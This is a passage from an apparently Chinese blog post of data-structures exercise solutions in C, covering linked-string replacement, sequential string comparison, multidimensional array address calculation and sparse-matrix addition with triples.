class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;linkstrnode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> linkstrnode *linkstring;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建单链表  尾插法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">strcreate</span><span class="params">(linkstring *S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    linkstrnode *p,*r;</span><br><span class="line">    *S = <span class="literal">NULL</span>;</span><br><span class="line">    r = <span class="literal">NULL</span>; <span class="comment">//r始终指向当前链式串最后一个字符对应的结点</span></span><br><span class="line">    <span class="keyword">while</span>((ch = getchar()) != <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p = (linkstrnode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linkstrnode));</span><br><span class="line">        p-&gt;data = ch;</span><br><span class="line">        <span class="keyword">if</span>(*S == <span class="literal">NULL</span>) <span class="comment">//本为空表</span></span><br><span class="line">            *S = p;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            r-&gt;next = p; <span class="comment">//不为空表</span></span><br><span class="line">        r = p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(r != <span class="literal">NULL</span>)</span><br><span class="line">        r-&gt;next = <span class="literal">NULL</span>; <span class="comment">//处理尾结点指针域</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(linkstring head)</span></span>&#123;</span><br><span class="line">    linkstrnode *p;</span><br><span class="line">    p = head;</span><br><span class="line">    <span class="keyword">while</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c-&gt;&quot;</span>,p-&gt;data);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//单链表拷贝函数</span></span><br><span class="line"><span class="function">linkstring <span class="title">copy</span><span class="params">(linkstring head)</span></span>&#123;</span><br><span class="line">    linkstring L = <span class="literal">NULL</span>,r = <span class="literal">NULL</span>,s,p;</span><br><span class="line">    p = head;</span><br><span class="line">    <span class="keyword">while</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        s = (linkstring)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linkstrnode));</span><br><span class="line">        s-&gt;data = p-&gt;data;</span><br><span class="line">        <span class="keyword">if</span>(L == <span class="literal">NULL</span>)</span><br><span class="line">            L = r = s;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            r-&gt;next = s;</span><br><span class="line">            r = s;</span><br><span class="line">        &#125;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(r!= <span class="literal">NULL</span>)</span><br><span class="line">        r-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//replace 函数</span></span><br><span class="line"><span class="function">linkstring <span class="title">replace</span><span class="params">(linkstring S,linkstring T1,linkstring T2)</span></span>&#123;</span><br><span class="line">    linkstring p,q,r,s,pre,temp,pos;</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (S == <span class="literal">NULL</span>|| T1 == <span class="literal">NULL</span> )  <span class="comment">//若 S 为空或 T1 为空,则原串不变</span></span><br><span class="line">        <span class="keyword">return</span> S; </span><br><span class="line">    pre = <span class="literal">NULL</span>;</span><br><span class="line">    pos = S; <span class="comment">/*pos 表示可能的 T1 串在 S 中的起始位置*/</span></span><br><span class="line">    <span class="keyword">while</span> (pos &amp;&amp; flag)</span><br><span class="line">    &#123;</span><br><span class="line">        p = pos;</span><br><span class="line">        q = T1;</span><br><span class="line">        <span class="keyword">while</span>(p &amp;&amp; q)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(p-&gt;data == q-&gt;data)&#123;</span><br><span class="line">                p = p-&gt;next;</span><br><span class="line">                q = q-&gt;next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                pre = pos;</span><br><span class="line">                pos = pos-&gt;next;</span><br><span class="line">                p = pos;</span><br><span class="line">                q = T1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(q != <span class="literal">NULL</span>)</span><br><span class="line">            flag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">            r = pos;</span><br><span class="line">            <span class="keyword">while</span>(r != p)</span><br><span class="line">            &#123;</span><br><span class="line">                s = r;</span><br><span class="line">                r = r-&gt;next;</span><br><span class="line">                <span class="built_in">free</span>(s);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(T2 != <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                temp = r = copy(T2);</span><br><span class="line">                <span class="keyword">while</span>(r-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">                    r = r-&gt;next;</span><br><span class="line">                r-&gt;next = p;</span><br><span class="line">                <span class="keyword">if</span>(pre == <span class="literal">NULL</span>)</span><br><span class="line">                    S = temp;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    pre-&gt;next = temp;</span><br><span class="line">                pre = r;</span><br><span class="line">                pos = p;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(pre == <span class="literal">NULL</span>)</span><br><span class="line">                    S = p;</span><br><span class="line">                <span class="keyword">else</span> </span><br><span class="line">                    pre-&gt;next = p;</span><br><span class="line">                pos = p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> S;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//主函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    linkstring S,T1,T2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入 S：&quot;</span>);</span><br><span class="line">    strcreate(&amp;S); </span><br><span class="line">    print(S);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n请输入 T1：&quot;</span>);</span><br><span class="line">    strcreate(&amp;T1);</span><br><span class="line">    print(T1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n请输入 T2：&quot;</span>);</span><br><span class="line">    strcreate(&amp;T2); </span><br><span class="line">    print(T2);</span><br><span class="line">    S=replace(S,T1,T2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n替换后的结果为：\n&quot;</span>);</span><br><span class="line">    print(S); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/22/6KrmNXFv4JglMCu.png" alt="image-20211022192220114"></p><h2 id="4-编写一个函数，实现在-顺序存储方式-下字符串的-strcompare-S1-S2"><a href="#4-编写一个函数，实现在-顺序存储方式-下字符串的-strcompare-S1-S2" class="headerlink" title="4. 编写一个函数，实现在 顺序存储方式 下字符串的 strcompare(S1,S2)"></a>4. 编写一个函数，实现在 <code>顺序存储方式</code> 下字符串的 <code>strcompare(S1,S2)</code></h2><p><strong>算法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//strcompare 函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcompare</span><span class="params">(seqstring s1,seqstring s2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,m = <span class="number">0</span>,len;</span><br><span class="line">    len = s1.length&lt;s2.length?s1.length:s2.length;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=len;i++)</span><br><span class="line">        <span class="keyword">if</span>(s1.str[i] &gt; s2.str[i])</span><br><span class="line">        &#123;</span><br><span class="line">            m = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(s1.str[i] &lt; s2.str[i])</span><br><span class="line">        &#123;</span><br><span class="line">            m = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> str[MAXSIZE];</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;seqstring;</span><br><span class="line"></span><br><span class="line"><span class="comment">//strcompare 函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcompare</span><span class="params">(seqstring s1,seqstring s2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,m = <span class="number">0</span>,len;</span><br><span class="line">    len = s1.length&lt;s2.length?s1.length:s2.length;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=len;i++)</span><br><span class="line">        <span class="keyword">if</span>(s1.str[i] &gt; s2.str[i])</span><br><span class="line">        &#123;</span><br><span class="line">            m = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(s1.str[i] &lt; s2.str[i])</span><br><span class="line">        &#123;</span><br><span class="line">            m = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//主函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    seqstring s1,s2;</span><br><span class="line">    <span class="keyword">int</span> i,m;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入 s1：\n&quot;</span>);</span><br><span class="line">    gets(s1.str);</span><br><span class="line">    s1.length=<span class="built_in">strlen</span>(s1.str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入 s2：\n&quot;</span>);</span><br><span class="line">    gets(s2.str);</span><br><span class="line">    s2.length = <span class="built_in">strlen</span>(s2.str);</span><br><span class="line">    m = strcompare(s1,s2);</span><br><span class="line">    <span class="keyword">if</span>(m == <span class="number">1</span>) </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;s1 &gt; s2\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(m == <span class="number">-1</span>) </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;s2 &gt; s1\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(m == <span class="number">0</span>) </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;s1 == s2\n&quot;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/22/xDUM8zHKQPw4Vd7.png" alt="image-20211022193108256"></p><h2 id="5-已知三维数组-A-3-2-4-，数组首地址为100，每个元素占用1个存储单元，分别计算数组元素-A-0-1-2-在-按行优先-和-按列优先-存储方式下的地址"><a href="#5-已知三维数组-A-3-2-4-，数组首地址为100，每个元素占用1个存储单元，分别计算数组元素-A-0-1-2-在-按行优先-和-按列优先-存储方式下的地址" class="headerlink" title="5. 已知三维数组 A[3][2][4]，数组首地址为100，每个元素占用1个存储单元，分别计算数组元素 A[0][1][2]在 按行优先 和 按列优先 存储方式下的地址"></a>5. 已知三维数组 <code>A[3][2][4]</code>，数组首地址为100，每个元素占用1个存储单元，分别计算数组元素 <code>A[0][1][2]</code>在 <code>按行优先</code> 和 <code>按列优先</code> 存储方式下的地址</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A[<span class="number">0</span>][<span class="number">1</span>][<span class="number">2</span>]按行优先方式在内存的存储地址为：<span class="number">100</span>+<span class="number">0</span>*<span class="number">8</span>+<span class="number">1</span>*<span class="number">4</span>+<span class="number">2</span>=<span class="number">106</span></span><br><span class="line">A[<span class="number">0</span>][<span class="number">1</span>][<span class="number">2</span>]按列优先方式在内存的储储地址为：<span class="number">100</span>+<span class="number">2</span>*<span class="number">6</span>+<span class="number">1</span>*<span class="number">3</span>+<span class="number">0</span>*<span class="number">8</span>=<span class="number">115</span> </span><br></pre></td></tr></table></figure><h2 id="6-已知两个-稀疏矩阵-A和B，其行数和列数均对应相等，编写一个函数，计算A和B之和，假设稀疏矩阵采用-三元组-表示。"><a href="#6-已知两个-稀疏矩阵-A和B，其行数和列数均对应相等，编写一个函数，计算A和B之和，假设稀疏矩阵采用-三元组-表示。" class="headerlink" title="6. 已知两个 稀疏矩阵 A和B，其行数和列数均对应相等，编写一个函数，计算A和B之和，假设稀疏矩阵采用 三元组 表示。"></a>6. 已知两个 <code>稀疏矩阵</code> A和B，其行数和列数均对应相等，编写一个函数，计算A和B之和，假设稀疏矩阵采用 <code>三元组</code> 表示。</h2><p><strong>算法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//三元组：矩阵相加</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(spmatrix a,spmatrix b,spmatrix c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,k,t,r;</span><br><span class="line">    i = j = k = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=a[<span class="number">0</span>][<span class="number">2</span>]&amp;&amp;j&lt;=b[<span class="number">0</span>][<span class="number">2</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i][<span class="number">0</span>] &lt; b[j][<span class="number">0</span>] || (a[i][<span class="number">0</span>] == b[j][<span class="number">0</span>] &amp;&amp; a[i][<span class="number">1</span>]&lt;b[j][<span class="number">1</span>]))&#123;</span><br><span class="line">             c[k][<span class="number">0</span>]=a[i][<span class="number">0</span>];</span><br><span class="line">             c[k][<span class="number">1</span>]=a[i][<span class="number">1</span>];</span><br><span class="line">             c[k][<span class="number">2</span>]=a[i][<span class="number">2</span>];</span><br><span class="line">             i++;k++;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a[i][<span class="number">0</span>] &gt; b[j][<span class="number">0</span>] || (a[i][<span class="number">0</span>] == b[j][<span class="number">0</span>] &amp;&amp; a[i][<span class="number">1</span>] &gt; b[j][<span class="number">1</span>]))&#123;</span><br><span class="line">                c[k][<span class="number">0</span>]=b[j][<span class="number">0</span>];</span><br><span class="line">                c[k][<span class="number">1</span>]=b[j][<span class="number">1</span>];</span><br><span class="line">                c[k][<span class="number">2</span>]=b[j][<span class="number">2</span>];</span><br><span class="line">                j++;k++;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a[i][<span class="number">0</span>] == b[j][<span class="number">0</span>] &amp;&amp; (a[i][<span class="number">1</span>] == b[j][<span class="number">1</span>]))&#123;</span><br><span class="line">            c[k][<span class="number">0</span>]=a[i][<span class="number">0</span>]; </span><br><span class="line">            c[k][<span class="number">1</span>]=a[i][<span class="number">1</span>];</span><br><span class="line">            c[k][<span class="number">2</span>]=a[i][<span class="number">2</span>]+b[j][<span class="number">2</span>];</span><br><span class="line">            i++;j++;</span><br><span class="line">            <span class="keyword">if</span>(c[k][<span class="number">2</span>] != <span class="number">0</span>) k++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(j &lt;= b[<span class="number">0</span>][<span class="number">2</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        c[k][<span class="number">0</span>]=b[j][<span class="number">0</span>];</span><br><span class="line">        c[k][<span class="number">1</span>]=b[j][<span class="number">1</span>];</span><br><span class="line">        c[k][<span class="number">2</span>]=b[j][<span class="number">2</span>];</span><br><span class="line">        j++;k++; </span><br><span class="line">    &#125;</span><br><span class="line"> <span class="keyword">while</span>(i &lt;= a[<span class="number">0</span>][<span class="number">2</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        c[k][<span class="number">0</span>]=a[i][<span class="number">0</span>];</span><br><span class="line">        c[k][<span class="number">1</span>]=a[i][<span class="number">1</span>];</span><br><span class="line">        c[k][<span class="number">2</span>]=a[i][<span class="number">2</span>];</span><br><span class="line">        i++;k++; </span><br><span class="line">    &#125;</span><br><span class="line">    c[<span class="number">0</span>][<span class="number">0</span>]=a[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">    c[<span class="number">0</span>][<span class="number">1</span>]=a[<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line">    c[<span class="number">0</span>][<span class="number">2</span>]=k<span class="number">-1</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> data[<span class="number">100</span>][<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> m,n; <span class="comment">//稀疏矩阵 行数、列数、非零元素的个数</span></span><br><span class="line">&#125;matrix;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> spmatrix[<span class="number">100</span>][<span class="number">3</span>];</span><br><span class="line">spmatrix c;</span><br><span class="line"></span><br><span class="line"><span class="comment">//三元组：矩阵相加</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(spmatrix a,spmatrix b,spmatrix c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,k,t,r;</span><br><span class="line">    i = j = k = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=a[<span class="number">0</span>][<span class="number">2</span>]&amp;&amp;j&lt;=b[<span class="number">0</span>][<span class="number">2</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i][<span class="number">0</span>] &lt; b[j][<span class="number">0</span>] || (a[i][<span class="number">0</span>] == b[j][<span class="number">0</span>] &amp;&amp; a[i][<span class="number">1</span>]&lt;b[j][<span class="number">1</span>]))&#123;</span><br><span class="line">             c[k][<span class="number">0</span>]=a[i][<span class="number">0</span>];</span><br><span class="line">             c[k][<span class="number">1</span>]=a[i][<span class="number">1</span>];</span><br><span class="line">             c[k][<span class="number">2</span>]=a[i][<span class="number">2</span>];</span><br><span class="line">             i++;k++;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a[i][<span class="number">0</span>] &gt; b[j][<span class="number">0</span>] || (a[i][<span class="number">0</span>] == b[j][<span class="number">0</span>] &amp;&amp; a[i][<span class="number">1</span>] &gt; b[j][<span class="number">1</span>]))&#123;</span><br><span class="line">                c[k][<span class="number">0</span>]=b[j][<span class="number">0</span>];</span><br><span class="line">                c[k][<span class="number">1</span>]=b[j][<span class="number">1</span>];</span><br><span class="line">                c[k][<span class="number">2</span>]=b[j][<span class="number">2</span>];</span><br><span class="line">                j++;k++;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a[i][<span class="number">0</span>] == b[j][<span class="number">0</span>] &amp;&amp; (a[i][<span class="number">1</span>] == b[j][<span class="number">1</span>]))&#123;</span><br><span class="line">            c[k][<span class="number">0</span>]=a[i][<span class="number">0</span>]; </span><br><span class="line">            c[k][<span class="number">1</span>]=a[i][<span class="number">1</span>];</span><br><span class="line">            c[k][<span class="number">2</span>]=a[i][<span class="number">2</span>]+b[j][<span class="number">2</span>];</span><br><span class="line">            i++;j++;</span><br><span class="line">            <span class="keyword">if</span>(c[k][<span class="number">2</span>] != <span class="number">0</span>) k++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(j &lt;= b[<span class="number">0</span>][<span class="number">2</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        c[k][<span class="number">0</span>]=b[j][<span class="number">0</span>];</span><br><span class="line">        c[k][<span class="number">1</span>]=b[j][<span class="number">1</span>];</span><br><span class="line">        c[k][<span class="number">2</span>]=b[j][<span class="number">2</span>];</span><br><span class="line">        j++;k++; </span><br><span class="line">    &#125;</span><br><span class="line"> <span class="keyword">while</span>(i &lt;= a[<span class="number">0</span>][<span class="number">2</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        c[k][<span class="number">0</span>]=a[i][<span class="number">0</span>];</span><br><span class="line">        c[k][<span class="number">1</span>]=a[i][<span class="number">1</span>];</span><br><span class="line">        c[k][<span class="number">2</span>]=a[i][<span 